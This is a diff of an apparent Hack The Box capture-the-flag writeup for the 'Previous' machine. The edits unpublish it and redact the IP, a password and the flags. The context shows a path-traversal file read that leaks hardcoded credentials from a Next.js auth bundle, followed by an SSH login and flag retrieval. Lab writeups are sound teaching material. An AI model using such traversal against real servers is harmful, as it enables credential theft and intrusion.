@@ -1,5 +1,6 @@
 ---
 title: Previous [Medium]
+published: false
 date: 2025-08-25
 tags: [htb, linux, nmap, nextjs, middleware, cve-2025-29927, lfi, zip, gobuster, terraform]
 categories: [HTB Writeups]
@@ -15,9 +16,9 @@ Author: [brun0ne](https://app.hackthebox.com/users/70197)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.109.233
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 23:38 EDT
-Nmap scan report for 10.129.109.233
+Nmap scan report for 10.129.xx.xx
 Host is up (0.34s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
@@ -36,7 +37,7 @@ Nmap done: 1 IP address (1 host up) scanned in 38.03 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.109.233     previous.htb
+10.129.xx.xx     previous.htb
 ```
 
 Let's check the web server.
@@ -621,15 +622,15 @@ Connection: keep-alive
 Content-Disposition: attachment; filename=../../../app/.next/server/pages/api/auth/[...nextauth].js
 ETag: "ihx6eiwskd47b"
 
-"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
+"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovexxxxxxxx")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
 ```
 
 There we go, found out credentials for `jeremy`. <br>
-&rarr; `jeremy:MyNameIsJeremyAndILovePancakes`
+&rarr; `jeremy:MyNameIsJeremyAndILovexxxxxxxx`
 
 ```bash
-└─$ ssh jeremy@10.129.109.233     
-jeremy@10.129.109.233's password: 
+└─$ ssh jeremy@10.129.xx.xx     
+jeremy@10.129.xx.xx's password: 
 jeremy@previous:~$ ls -la
 total 36
 drwxr-x--- 4 jeremy jeremy 4096 Aug 21 20:24 .
@@ -643,7 +644,7 @@ drwxr-xr-x 3 jeremy jeremy 4096 Aug 21 20:09 docker
 -rw-rw-r-- 1 jeremy jeremy  150 Aug 21 18:48 .terraformrc
 -rw-r----- 1 root   jeremy   33 Aug 24 03:35 user.txt
 jeremy@previous:~$ cat user.txt
-bc9aa982ce3287605475b846835c6aeb
+bc9aa9xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Grab our `user.txt` flag.
@@ -882,7 +883,7 @@ drwx------  2 root root 4096 Aug 21 18:53 .ssh
 drwxr-xr-x  3 root root 4096 Aug 21 18:12 .terraform.d
 -rw-r--r--  1 root root  150 Aug 21 18:48 .terraformrc
 bash-5.1# cat root.txt
-f11427eed65a945accce4dffe740c1fb
+f11427xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 BOOM! Nailed the `root.txt` flag.
